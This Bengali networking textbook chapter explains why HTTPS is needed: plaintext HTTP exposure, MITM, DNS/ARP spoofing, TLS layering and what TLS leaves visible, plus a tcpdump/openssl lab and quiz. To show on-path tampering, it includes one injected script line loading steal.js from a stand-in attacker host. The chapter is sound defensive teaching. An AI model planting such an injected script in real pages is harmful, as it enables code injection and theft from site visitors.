Chapter 31

Why HTTPS?

HTTP-র প্রতিটি byte plaintext-এ যায়। আপনার packet আপনার machine থেকে server পর্যন্ত ১৫টি router, ৩টি ISP, এবং হয়তো কয়েকটি অজানা middlebox পেরোয়। তাদের প্রত্যেকে সবকিছু পড়তে পারে — এবং বদলাতেও পারে।

31.1 Plaintext HTTP-তে কী দেখা যায়

আপনি ──▶ Wi-Fi ──▶ Router ──▶ ISP ──▶ ... ──▶ Server
          ↑          ↑          ↑        ↑
          └──────────┴──────────┴────────┘
            এই প্রত্যেকটি বিন্দুতে যে কেউ
            পুরো traffic পড়তে ও বদলাতে পারে

Plaintext HTTP-তে তারে যা যায়:

  POST /login HTTP/1.1
  Host: bank.example.com
  Content-Type: application/x-www-form-urlencoded
  Cookie: session=abc123xyz

  username=reza&password=MySecret123

  ★ password স্পষ্ট অক্ষরে ★
  ★ session cookie স্পষ্ট — চুরি করে ব্যবহার করা যায় ★
  ★ পুরো URL, সব header, পুরো body ★

31.2 তিনটি ভিন্ন সমস্যা

সমস্যাআক্রমণসমাধান
Confidentiality
(গোপনীয়তা)		Eavesdropping — কেউ পড়ে ফেলছেEncryption
Integrity
(অখণ্ডতা)		Tampering — কেউ বদলে দিচ্ছেMAC / AEAD
Authentication
(পরিচয় যাচাই)		Impersonation — নকল serverCertificate + CA
⚠️ শুধু encryption যথেষ্ট নয় — একটি গুরুত্বপূর্ণ ভুল ধারণা

ধরুন আপনি শুধু encryption করলেন, কিন্তু server-এর পরিচয় যাচাই করলেন না। তখন:

আপনি ──encrypted──▶ ??? ──encrypted──▶ আসল server
                     ↑
              আক্রমণকারী এখানে

সে আপনার সাথে একটি encrypted connection করল,
এবং server-এর সাথে আরেকটি encrypted connection করল।

দুটোই "নিরাপদ" — কিন্তু সে মাঝখানে সবকিছু
পড়তে ও বদলাতে পারছে।

এটাই ★man-in-the-middle (MITM)★ আক্রমণ।

এজন্যই তিনটি একসাথে দরকার। Encryption ছাড়া integrity অর্থহীন, authentication ছাড়া encryption অর্থহীন। TLS তিনটিই দেয়।

31.3 বাস্তব আক্রমণের দৃশ্য

দৃশ্য: café-র Wi-Fi

আক্রমণকারী শুধু চুপচাপ শুনছে (promiscuous mode,
বা ARP spoofing করে traffic নিজের দিকে টেনে — Ch 8)

সে পায়:
  ✓ আপনি কোন site-এ যাচ্ছেন
  ✓ আপনার session cookie  → ★ account দখল ★
  ✓ Login form-এর password
  ✓ আপনার পড়া প্রতিটি page
  ✓ আপনার পাঠানো প্রতিটি message

সবচেয়ে ভয়ানক দিক: কোনো চিহ্ন থাকে না।
আপনি কখনো জানবেন না।

★ HTTPS-এ সে শুধু পায়: আপনি কোন IP-তে যাচ্ছেন,
  কত bytes, এবং SNI থেকে domain নাম (Ch 33)।
  বাকি সব অদৃশ্য।
দৃশ্য: আক্রমণকারী বা এমনকি একটি ISP

Traffic শুধু পড়ছে না — বদলে দিচ্ছে:

  Server পাঠাল:
    <script src="/app.js"></script>

  আপনার কাছে পৌঁছাল:
    <script src="/app.js"></script>
    <script src="//attacker.com/steal.js"></script>

বাস্তব ঘটনা (কল্পনা নয়):
  • কিছু ISP plaintext HTTP page-এ বিজ্ঞাপন inject করত
  • কিছু hotel Wi-Fi নিজেদের banner যোগ করত
  • "Great Cannon" আক্রমণে JavaScript inject করে
    ব্যবহারকারীদের browser দিয়ে DDoS চালানো হয়েছিল
  • Download করা executable-এ malware যোগ করা হয়েছে

★ Integrity protection ছাড়া আপনি কখনো নিশ্চিত হতে
  পারবেন না যে আপনার কাছে যা পৌঁছাল তা server
  পাঠিয়েছিল।
দৃশ্য: DNS spoofing বা ARP spoofing

আপনি লিখলেন: bank.example.com

আক্রমণকারী DNS-এর জাল উত্তর দিল, বা ARP spoofing
করে নিজেকে gateway বানাল।

আপনি পৌঁছালেন তার server-এ, যা হুবহু আসল
bank-এর মতো দেখতে।

আপনি password দিলেন। সে পেয়ে গেল।

★ HTTPS-এ এটি ব্যর্থ হয় ★
  কারণ আক্রমণকারীর কাছে bank.example.com-এর জন্য
  একটি বৈধ certificate নেই — এবং কোনো CA তাকে
  সেটি দেবে না, কারণ সে domain-টির মালিকানা প্রমাণ
  করতে পারবে না।

  Browser দেখাবে: "Your connection is not private
  — NET::ERR_CERT_AUTHORITY_INVALID"

  এই সতর্কবার্তাটিই HTTPS-এর সবচেয়ে গুরুত্বপূর্ণ
  অবদান — এটি ছাড়া আপনি কখনো জানতেন না।

31.4 HTTPS = HTTP + TLS

HTTP-তে কোনো পরিবর্তন হয় না। শুধু নিচে একটি স্তর যোগ হয়:

    HTTP                      HTTPS
   ┌────────┐               ┌────────┐
   │ HTTP   │               │ HTTP   │  ← হুবহু একই
   ├────────┤               ├────────┤
   │        │               │  TLS   │  ← ★ নতুন স্তর ★
   │  TCP   │               ├────────┤
   ├────────┤               │  TCP   │
   │  IP    │               ├────────┤
   └────────┘               │  IP    │
                            └────────┘

  Port 80                    Port 443

★ HTTP-র একটি byte-ও বদলায়নি। একই method, একই
  header, একই status code। TLS শুধু সেই bytes-গুলোকে
  encrypt করে পাঠায়।

এজন্যই আপনার application code HTTPS-এর জন্য কিছুই
বদলাতে হয় না — শুধু URL-এ 's' যোগ হয়।
✓ TLS শুধু HTTP-র জন্য নয়

TLS একটি সাধারণ-উদ্দেশ্যের নিরাপত্তা-স্তর, যা যেকোনো TCP-ভিত্তিক protocol-এর নিচে বসতে পারে:

HTTPS = HTTP + TLS SMTPS = SMTP + TLS IMAPS = IMAP + TLS LDAPS = LDAP + TLS PostgreSQL + TLS MQTT + TLS gRPC + TLS

এটিই layering-এর শক্তির চমৎকার উদাহরণ — একটি স্তর একবার লিখে বহু protocol-এ পুনর্ব্যবহার।

31.5 "আমার site-এ সংবেদনশীল কিছু নেই" — কেন এই যুক্তি ভুল

⚠️ HTTPS শুধু গোপনীয়তার জন্য নয়
  • Integrity: HTTP হলে ISP বা café-র Wi-Fi আপনার page-এ বিজ্ঞাপন বা malware inject করতে পারে। আপনার site-এ "গোপন" কিছু না থাকলেও আপনার ব্যবহারকারীরা ক্ষতিগ্রস্ত হবে।
  • Authenticity: HTTPS ছাড়া ব্যবহারকারী জানতে পারে না সে আসলেই আপনার server-এর সাথে কথা বলছে।
  • Browser-এর বাধ্যবাধকতা: Service Worker, Geolocation, Camera/Microphone, HTTP/2, HTTP/3, Web Crypto — এসব API শুধু secure context-এ কাজ করে। HTTP মানে এগুলো ব্যবহার করাই যাবে না।
  • SEO ও ব্যবহারকারীর আস্থা: Browser এখন HTTP site-এ "Not Secure" দেখায়।
  • খরচ শূন্য: Let's Encrypt বিনামূল্যে, স্বয়ংক্রিয়ভাবে নবায়নযোগ্য certificate দেয়। Caddy-র মতো server এটি সম্পূর্ণ স্বয়ংক্রিয়ভাবে করে।

একই যুক্তি internal service-এর জন্যও প্রযোজ্য। "আমাদের private network" ধরে নিরাপদ ভাবা আধুনিক নিরাপত্তা-চিন্তায় (zero trust) গ্রহণযোগ্য নয় — Chapter 7 ও 8-এ আমরা দেখেছি local network কতটা সহজে আপস করা যায়।

31.6 TLS যা লুকায় এবং যা লুকায় না

একজন পর্যবেক্ষক HTTPS traffic দেখে যা জানতে পারে:

  ✓ আপনার IP এবং server-এর IP
  ✓ Port (443 → HTTPS)
  ✓ Connection কখন শুরু, কখন শেষ
  ✓ কত bytes গেল, কত এল
  ✓ Packet-এর timing ও আকারের ধরন
  ✓ ★ Domain নাম ★ — TLS handshake-এর SNI field থেকে
  ✓ ★ Certificate ★ — এটিও plaintext-এ যায়
  ✓ DNS query (যদি DoH/DoT না থাকে)

  ✗ URL-এর path ও query
  ✗ HTTP header (cookie, authorization)
  ✗ Request/response body
  ✗ আপনি কোন page দেখলেন

★ অর্থাৎ TLS লুকায় "কী", কিন্তু "কার সাথে" নয়।

Encrypted Client Hello (ECH) SNI-ও encrypt করার
চেষ্টা করছে, কিন্তু এখনো সর্বত্র প্রচলিত নয়।

আর traffic analysis একটি বাস্তব ঝুঁকি: packet-এর
আকার ও timing-এর ধরন দেখে কখনো কখনো অনুমান করা
যায় কোন page দেখা হচ্ছে।
🧪 Lab 31 — Plaintext এবং encrypted পাশাপাশি

আমরা কী দেখতে চাইছি? — HTTP-তে আপনার data কতটা স্পষ্টভাবে দৃশ্যমান, এবং HTTPS-এ কতটা লুকানো।

bash
# HTTP — সবকিছু পড়া যায়
sudo tcpdump -i any -n -A -c 20 'tcp port 80' &
curl -s "http://example.com/search?q=my-secret-query" > /dev/null
# output-এ পুরো request text দেখতে পাবেন

# HTTPS — শুধু আবর্জনা
sudo tcpdump -i any -n -A -c 20 'tcp port 443' &
curl -s "https://example.com/search?q=my-secret-query" > /dev/null
# শুধু binary noise — কিন্তু প্রথম packet-এ SNI দেখা যাবে

# SNI (domain নাম) plaintext-এ যায় — প্রমাণ করুন
sudo tcpdump -i any -n -A -c 5 'tcp port 443' 2>/dev/null | grep -a example

# Certificate নিজে দেখুন
openssl s_client -connect example.com:443 -servername example.com </dev/null 2>/dev/null \
  | openssl x509 -noout -subject -issuer -dates

যা লক্ষ্য করবেন: HTTP-র dump-এ GET /search?q=my-secret-query স্পষ্ট অক্ষরে পড়া যাচ্ছে — সাথে সব header ও cookie। HTTPS-এর dump-এ শুধু অর্থহীন byte, কিন্তু প্রথম packet-এ (ClientHello) example.com লেখাটি পাওয়া যাবে — এটাই SNI। Certificate-এ দেখবেন কার নামে ইস্যু, কে ইস্যু করেছে (CA), এবং মেয়াদ।

আমরা কী শিখলাম: "HTTP অনিরাপদ" কোনো তাত্ত্বিক দাবি নয় — আপনি নিজের চোখে আপনার query, cookie ও password তারে যেতে দেখলেন। আর HTTPS-ও সবকিছু লুকায় না: domain নাম তখনো দৃশ্যমান।

📌 Chapter Summary
  • Plaintext HTTP-তে পথের যে কেউ সবকিছু পড়তে ও বদলাতে পারে — কোনো চিহ্ন না রেখে।
  • তিনটি ভিন্ন সমস্যা: confidentiality (পড়া), integrity (বদলানো), authentication (নকল পরিচয়)।
  • শুধু encryption যথেষ্ট নয় — authentication ছাড়া MITM আক্রমণ সফল হয়।
  • HTTPS = HTTP + TLS; HTTP-র একটি byte-ও বদলায় না।
  • TLS একটি সাধারণ স্তর — SMTP, IMAP, PostgreSQL, gRPC সবকিছুতে ব্যবহৃত।
  • "সংবেদনশীল কিছু নেই" যুক্তি ভুল: integrity, browser API, এবং ব্যবহারকারীর নিরাপত্তা সবার জন্যই দরকার।
  • TLS লুকায় "কী", কিন্তু "কার সাথে" নয় — IP ও SNI দৃশ্যমান থাকে।
✓ Quick Check
শুধু encryption থাকলে কিন্তু authentication না থাকলে কী সমস্যা?

Man-in-the-middle আক্রমণ সফল হয়। আক্রমণকারী আপনার সাথে একটি encrypted connection এবং আসল server-এর সাথে আরেকটি encrypted connection করে। দুটোই কারিগরিভাবে "নিরাপদ", কিন্তু সে মাঝখানে সব plaintext দেখে ও বদলাতে পারে। Certificate-এর কাজ হলো নিশ্চিত করা যে আপনি যার সাথে key বিনিময় করছেন সে-ই প্রকৃত server।

HTTPS ব্যবহার করলে একজন পর্যবেক্ষক কী কী তখনো দেখতে পায়?

আপনার IP, server-এর IP ও port, connection-এর সময় ও স্থায়িত্ব, transfer হওয়া bytes-এর পরিমাণ, packet-এর timing ও আকারের ধরন, TLS handshake-এর SNI থেকে domain নাম, এবং server-এর certificate। সে দেখতে পায় না: URL-এর path/query, header, cookie, এবং body।

একটি static blog-এ (কোনো login নেই, কোনো form নেই) HTTPS দরকার কি?

হ্যাঁ। গোপনীয়তার জন্য নয়, মূলত integrity-র জন্য: HTTP হলে ISP বা café-র Wi-Fi আপনার page-এ বিজ্ঞাপন বা ক্ষতিকর script inject করতে পারে, এবং আপনার পাঠকরা ক্ষতিগ্রস্ত হবেন। এছাড়া HTTP/2, HTTP/3 ও আধুনিক browser API শুধু secure context-এ কাজ করে, browser "Not Secure" দেখায়, এবং Let's Encrypt-এর কারণে খরচ শূন্য।
